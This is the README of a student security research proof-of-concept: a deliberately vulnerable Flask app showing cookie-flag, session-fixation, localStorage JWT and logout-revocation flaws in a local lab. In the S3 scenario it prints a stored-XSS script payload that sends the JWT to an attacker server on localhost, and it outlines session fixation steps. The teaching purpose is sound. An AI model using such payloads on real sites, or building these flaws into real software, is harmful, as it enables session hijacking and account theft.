# PRP — Token & Session Handling PoC

**Personal Research Project · FHICT · Cyber Security specialisation**  
Sprint 2 proof-of-concept for *Security Analysis of Token and Session Handling in Modern Web Applications*.

This application deliberately implements four common token and session vulnerabilities so they can be demonstrated, observed, and compared against a hardened implementation in a controlled lab environment.

> ⚠️ **For educational use only.** Run exclusively in an isolated local environment. Never expose this application to a public network.

---

## Vulnerabilities implemented

| ID | Vulnerability | OWASP ASVS |
|----|--------------|------------|
| S1 | Missing cookie security flags (Secure, HttpOnly, SameSite) | V3.4.1–3.4.5 |
| S2 | Session fixation — session ID not regenerated on login | V3.3.1 |
| S3 | JWT stored in `localStorage` — exfiltrated via stored XSS | V3.5.3 |
| S4 | Broken logout — no server-side token revocation | V3.5.2 |

---

## Stack

- **Backend:** Python 3.11 + Flask + flask-session (filesystem sessions)
- **Auth:** Server-side session cookies (S1/S2) + PyJWT bearer tokens (S3/S4)
- **Database:** SQLite via SQLAlchemy
- **Frontend:** Jinja2 templates + vanilla JS
- **Infrastructure:** Docker Compose (app container + attacker container)

---

## Quick start

### With Docker (recommended)

```bash
docker compose up --build
```

| Service | URL | Description |
|---------|-----|-------------|
| App (INSECURE) | http://localhost:5000 | Vulnerable application |
| Attacker server | http://localhost:8888 | S3 token exfiltration receiver |

### Without Docker

```bash
pip install -r requirements.txt
python run.py              # INSECURE profile (default)
python run.py --secure     # SECURE profile (Sprint 3)
```

---

## Project structure

```
prp-token-session/
├── app/
│   ├── __init__.py        # Flask factory — loads INSECURE or SECURE config
│   ├── config.py          # InsecureConfig / SecureConfig
│   ├── models.py          # User, Note, RevokedToken
│   ├── auth_session.py    # Cookie-based login/logout (S1, S2)
│   ├── auth_jwt.py        # JWT issue / verify / revoke (S3, S4)
│   ├── routes.py          # All HTTP routes
│   └── templates/         # Jinja2 templates
├── attacker/
│   ├── steal_token_server.py   # S3 — logs exfiltrated JWTs
│   ├── fixation.py             # S2 — session fixation instructions
│   └── xss_payload.html        # S3 — exfil landing page
├── evidence/
│   ├── S1/   S2/   S3/   S4/  # Evidence collected during testing
├── docker-compose.yml
├── requirements.txt
└── run.py
```

---

## Profiles

The same codebase supports both profiles via a single config toggle.

| Setting | INSECURE | SECURE |
|---------|----------|--------|
| Cookie Secure / HttpOnly / SameSite | ✗ absent | ✓ present |
| Session ID regenerated on login | ✗ no | ✓ yes |
| JWT storage | `localStorage` | memory only |
| Server-side token revocation | ✗ no | ✓ deny-list |
| Token expiry | 60 min | 5 min |

Switch profiles by setting the environment variable before starting:

```bash
PROFILE=SECURE python run.py --secure
```

Or in `docker-compose.yml`, change `PROFILE=INSECURE` to `PROFILE=SECURE`.

---

## Attack scenarios

### S1 — Missing cookie flags
Log in and inspect the `Set-Cookie` response header in DevTools. The `session` cookie has no `Secure`, `HttpOnly`, or `SameSite` attributes. Run `document.cookie` in the console to confirm the session ID is readable from JavaScript.

### S2 — Session fixation
```bash
python attacker/fixation.py
```
Follow the printed two-step instructions: get a real session ID from `/set`, plant it in the victim's browser via `/set?sid=<ID>`, have the victim log in, then access the dashboard with the original cookie.

### S3 — XSS token theft
Start the attacker server (`docker compose up` includes it), get a JWT via the dashboard API Login button, then post this note:
```
<script>fetch('http://localhost:8888/?t='+localStorage.getItem('jwt'))</script>
```
Watch `docker compose logs -f attacker` for the stolen token.

### S4 — Token replay after logout
Copy the JWT from `localStorage.getItem('jwt')`, click API Logout, then call `/api/me` with the same token — the server returns `200` because no revocation state exists.

---

## Responsible disclosure

All testing is limited to this self-built proof of concept running in an isolated local environment. No external systems are tested. Vulnerabilities studied are well-documented OWASP classes, not novel findings.
